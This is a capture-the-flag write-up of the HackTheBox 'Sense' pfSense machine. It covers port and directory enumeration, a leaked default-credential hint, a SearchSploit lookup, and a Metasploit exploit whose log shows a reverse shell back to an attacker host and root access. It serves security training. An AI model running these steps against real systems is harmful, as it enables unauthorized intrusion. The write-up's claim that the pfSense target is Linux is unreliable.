# HackTheBox Sense — Medium Linux Machine Writeup

![HackTheBox](https://img.shields.io/badge/HackTheBox-Sense-green?style=for-the-badge&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-red?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Pentesting-blue?style=for-the-badge)
![Web](https://img.shields.io/badge/Web-pfSense-black?style=for-the-badge)

> **HackTheBox Sense** is a Medium-difficulty Linux-based machine focused on web enumeration, pfSense identification, information disclosure, credential discovery, vulnerability research, and remote code execution.

---

## 📋 Table of Contents

- [Machine Information](#machine-information)
- [Initial Enumeration](#initial-enumeration)
- [Port and Service Enumeration](#port-and-service-enumeration)
- [Web Enumeration](#web-enumeration)
- [Directory and File Fuzzing](#directory-and-file-fuzzing)
- [Information Disclosure](#information-disclosure)
- [Credential Discovery](#credential-discovery)
- [Vulnerability Research](#vulnerability-research)
- [Exploitation with Metasploit](#exploitation-with-metasploit)
- [Initial Access](#initial-access)
- [Privilege Verification](#privilege-verification)
- [Flag Retrieval](#flag-retrieval)
- [Attack Chain Summary](#attack-chain-summary)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## 🖥️ Machine Information

| Property | Details |
|----------|---------|
| **Machine** | Sense |
| **Platform** | HackTheBox |
| **Difficulty** | Medium |
| **Operating System** | Linux |
| **Target IP** | `10.129.88.196` |
| **Primary Services** | HTTP, HTTPS |
| **Web Server** | lighttpd 1.4.35 |
| **Web Application** | pfSense |
| **Initial Access** | Web Application Exploitation |
| **Privilege Level** | Root |
| **Tools** | Nmap, FFUF, SearchSploit, Metasploit |

---

## 🚀 Initial Enumeration

Today we are back with another **HackTheBox Medium-difficulty machine**, this time enumerating and exploiting the Linux-based machine named **Sense**.

The target IP provided by HackTheBox is:

```
10.129.88.196
```

As usual, the first step is to perform a complete TCP port scan to identify all exposed services.

---

## 🔍 Port and Service Enumeration

### Full TCP Port Scan

I started with an all-port Nmap scan:

```bash
nmap -p- --min-rate 1000 10.129.88.196
```

The scan returned:

```
Nmap scan report for 10.129.88.196
Host is up, received syn-ack ttl 63.
Scanned at 2026-09-19 23:13:32 EDT for 28s
Not shown: 998 filtered tcp ports (no-response)

PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

Only two TCP ports were exposed:

- `80/tcp` — HTTP
- `443/tcp` — HTTPS

Since both ports were related to web services, the next step was service and version enumeration.

### Service and Version Detection

I performed an Nmap service detection scan:

```bash
nmap -sC -sV -p80,443 10.129.88.196
```

The result was:

```
Nmap scan report for 10.129.88.196
Host is up, received echo-reply ttl 63.
Scanned at 2026-09-19 23:15:18 EDT for 21s

PORT    STATE SERVICE    REASON         VERSION
80/tcp  open  http       syn-ack ttl 63 lighttpd 1.4.35
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.88.196/
|_http-server-header: lighttpd/1.4.35

443/tcp open  ssl/https? syn-ack ttl 63
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/localityName=Somecity/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)
| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/localityName=Somewhere/countryName=US/localityName=Somecity/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)
```

The important information from the scan was:

- `80/tcp  open  http   lighttpd 1.4.35`
- `443/tcp open  https`

Port 80 redirected to HTTPS.

### HTTPS Certificate Enumeration

Nmap also exposed information about the TLS certificate on port 443.

The certificate contained several default-looking values:

**Subject:**
- Common Name = Common Name (eg, YOUR name)
- Organization = CompanyName
- State = Somewhere
- Country = US

The certificate was also expired:

- **Not valid before:** 2017-10-14
- **Not valid after:** 2023-04-06

The public key was:

- **RSA 1024-bit**

Although the certificate itself did not directly provide an attack path, the certificate and web-server information helped confirm that the target was running an older web application environment.

---

## 🕵️ Web Enumeration

Opening the target in a browser showed a **pfSense login interface**.

Both HTTP and HTTPS appeared to lead to the same web application.

At this point, the focus shifted toward identifying:

- Hidden directories
- Backup files
- Configuration files
- Documentation
- User information
- Default credentials
- pfSense-specific files

Because the application was clearly web-based, directory and file enumeration was the next logical step.

---

## 📁 Directory and File Fuzzing

I used **FFUF** to enumerate common directories and files:

```bash
ffuf -s -ac -u https://10.129.88.196/FUZZ/ \
-w /usr/share/wordlists/dirb/common.txt \
-e .txt
```

The scan discovered several interesting resources:

- `changelog.txt`
- `favicon.ico`
- `index.html`
- `index.php`
- `installer`
- `tree`
- `xmlrpc.php`
- `system-users.txt` ⭐ **CRITICAL**

Among these results, the most interesting file was:

```
system-users.txt
```

Files containing system or user information are particularly valuable during web enumeration because they can potentially disclose usernames, credentials, or internal administrative information.

---

## 💾 Information Disclosure

I accessed:

```
https://10.129.88.196/system-users.txt
```

The file contained the following support-ticket-style information:

```
###Support ticket###

Please create the following user

username: Rohit
password: company defaults
```

This disclosed a valid-looking username:

```
Rohit
```

The password was not explicitly written out, but the phrase:

```
company defaults
```

suggested that a default pfSense credential should be tested.

A likely credential combination was therefore:

```
Rohit:pfsense
```

This demonstrates the importance of checking seemingly harmless files discovered during directory enumeration.

---

## 🔐 Credential Discovery

The exposed information gave us:

- **Username:** `Rohit`
- **Password:** `pfsense`

These credentials could then be tested against the pfSense login interface.

However, instead of relying solely on credential reuse, I also investigated the version and known vulnerabilities associated with the pfSense installation.

---

## 🔬 Vulnerability Research

The target was running an old pfSense installation.

I used **SearchSploit** to search the local Exploit Database:

```bash
searchsploit pfSense
```

One particularly relevant result was:

```
Exploit: pfSense Community Edition 2.2.6 - Multiple Vulnerabilities
URL: https://www.exploit-db.com/exploits/39709
Path: /usr/share/exploitdb/exploits/php/webapps/39709.txt
Codes: N/A
Verified: False
File Type: HTML document, Unicode text, UTF-8 text
```

I copied the exploit locally using:

```bash
searchsploit -m 39709
```

This created:

```
/home/naval0505/39709.txt
```

The exploit information indicated multiple vulnerabilities affecting older pfSense versions.

---

## ⚔️ Exploitation with Metasploit

The same vulnerability class was also available through the Metasploit Framework.

The relevant Metasploit module was:

```
exploit(unix/http/pfsense_graph_injection_exec)
```

The module was executed against the target.

The reverse handler was configured on:

```
10.10.15.95:4444
```

The exploitation process produced:

```
[*] Started reverse TCP handler on 10.10.15.95:4444
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Sending stage (42137 bytes) to 10.129.88.196
[+] Deleted XVsLxay
[*] Meterpreter session 1 opened
```

A Meterpreter session was successfully established.

---

## 🎯 Initial Access

After obtaining the Meterpreter session, I initially attempted:

```bash
id
```

However, Meterpreter returned:

```
[-] Unknown command: id. Run the help command for more details.
```

The `id` command is a shell command rather than a native Meterpreter command.

To interact with the underlying operating system, I switched to a system shell:

```bash
shell
```

Metasploit created a shell:

```
Process 27165 created.
Channel 0 created.
```

I then executed:

```bash
id
```

The result was:

```
uid=0(root) gid=0(wheel) groups=0(wheel)
```

This confirmed that the obtained shell already had:

- **UID:** `0`
- **User:** `root`
- **Group:** `wheel`

Therefore, no additional local privilege escalation was required.

---

## ✅ Privilege Verification

The most important result was:

```
uid=0(root)
```

This means the exploitation chain provided direct root-level access to the pfSense system.

I then moved into the root user's home directory:

```bash
cd /root
```

Listing the directory showed:

```
.cshrc
.first_time
.gitsync_merge.sample
.hushlogin
.login
.part_mount
.profile
.shrc
.tcshrc
root.txt
```

The presence of:

```
root.txt
```

confirmed that the root flag was available.

---

## 🚩 Flag Retrieval

### Root Flag

The root flag was retrieved using:

```bash
cat root.txt
```

This successfully displayed the root flag.

At this point, the machine had been completely compromised with root-level access.

### User Flag

The user flag was also accessible after obtaining the compromised system shell.

With root privileges, both:

- `user.txt`
- `root.txt`

could be accessed.

Therefore, the machine was fully compromised.

---

## 📊 Attack Chain Summary

```
                    ┌──────────────────────┐
                    │   HackTheBox Sense   │
                    │   10.129.88.196      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  Nmap Enumeration    │
                    │  80 / 443 Open       │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Web Enumeration     │
                    │      FFUF             │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  system-users.txt    │
                    │  Information Leak    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Username: Rohit      │
                    │ Default Credential   │
                    │ Hint: pfsense        │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  pfSense Enumeration │
                    │  Vulnerability       │
                    │  Research            │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │    Metasploit        │
                    │ pfSense Exploitation │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │    Meterpreter       │
                    │      Session         │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │      Shell           │
                    │     UID 0            │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │    ROOT ACCESS       │
                    │   user.txt/root.txt  │
                    └──────────────────────┘
```

---

## 💡 Key Takeaways

### 1. Always Perform Full Port Enumeration

The initial scan revealed only:

- `80/tcp`
- `443/tcp`

Even with a small attack surface, both services were worth investigating thoroughly.

### 2. Enumerate Web Applications Aggressively

The web application contained several interesting files that were not necessarily linked from the main page.

FFUF discovered:

- `changelog.txt`
- `installer`
- `tree`
- `xmlrpc.php`
- `system-users.txt`

**Hidden files can expose information that significantly changes the attack path.**

### 3. Information Disclosure Can Lead to Initial Access

The most important discovery was:

```
system-users.txt
```

The file exposed a username and a password hint:

- `username: Rohit`
- `password: company defaults`

This demonstrates why files containing system information should always be investigated.

### 4. Research the Application Version

Once an old pfSense installation was identified, vulnerability research became an important part of the enumeration process.

SearchSploit was useful for quickly identifying publicly documented vulnerabilities:

```bash
searchsploit pfSense
```

### 5. Understand Your Exploitation Framework

When the Meterpreter session was obtained, the command:

```bash
id
```

did not work directly because `id` is a Linux shell command rather than a native Meterpreter command.

Using:

```bash
shell
```

provided access to the underlying operating system.

**This is a small but important operational detail when working with Metasploit.**

### 6. Verify Privileges After Exploitation

After obtaining a shell, always determine the current privilege level:

```bash
id
```

The result:

```
uid=0(root) gid=0(wheel)
```

immediately confirmed that the machine had already been compromised with root privileges.

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Nmap** | Port scanning and service/version enumeration |
| **FFUF** | Directory and file discovery |
| **SearchSploit** | Local Exploit Database research |
| **Metasploit Framework** | Exploitation and payload delivery |
| **Meterpreter** | Post-exploitation session |
| **Linux Shell** | Command execution and privilege verification |

---

## 📝 Commands Used

### Nmap — Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.88.196
```

### Nmap — Service Enumeration

```bash
nmap -sC -sV -p80,443 10.129.88.196
```

### FFUF — Web Enumeration

```bash
ffuf -s -ac -u https://10.129.88.196/FUZZ/ \
-w /usr/share/wordlists/dirb/common.txt \
-e .txt
```

### SearchSploit — Vulnerability Research

```bash
searchsploit pfSense
```

### Copy Exploit

```bash
searchsploit -m 39709
```

### Metasploit — Exploitation

```
use exploit/unix/http/pfsense_graph_injection_exec
run
```

### Switch to Shell

```bash
shell
```

### Check Current User

```bash
id
```

### Access Root Directory

```bash
cd /root
ls
```

### Read Root Flag

```bash
cat root.txt
```

---

## 🎬 Final Attack Path

```
Nmap
  ↓
80/443 discovered
  ↓
pfSense identified
  ↓
FFUF directory/file enumeration
  ↓
system-users.txt discovered
  ↓
Username and default credential information
  ↓
pfSense vulnerability research
  ↓
SearchSploit
  ↓
Metasploit pfSense exploit
  ↓
Meterpreter session
  ↓
Shell
  ↓
UID 0 / root
  ↓
user.txt + root.txt
```

---

## 🏁 Conclusion

The **HackTheBox Sense** machine demonstrates a realistic penetration-testing workflow where seemingly minor information disclosures can become the starting point for a complete compromise.

The attack began with basic network enumeration and progressed through web enumeration, information disclosure, credential analysis, vulnerability research, exploitation, and privilege verification.

### Most Important Lessons from This Machine:

✔️ Perform complete port scans  
✔️ Enumerate web applications beyond the homepage  
✔️ Investigate discovered text files and configuration files  
✔️ Pay attention to leaked usernames and credential hints  
✔️ Identify software versions before selecting an exploit  
✔️ Use vulnerability databases such as Exploit-DB/SearchSploit during research  
✔️ Understand the difference between Meterpreter commands and operating-system commands  
✔️ Always verify privileges after obtaining a shell  

**The final result was root-level access to the target system and successful retrieval of both the user and root flags.**

---

## 📌 References

- [HackTheBox](https://www.hackthebox.com/)
- [Exploit-DB](https://www.exploit-db.com/)
- [Metasploit Framework](https://www.metasploit.com/)
- [pfSense](https://www.pfsense.org/)
- [FFUF](https://github.com/ffuf/ffuf)

---

**Last Updated:** 2026-09-20  
**Author:** NavalK
**Status:** ✅ Machine Compromised
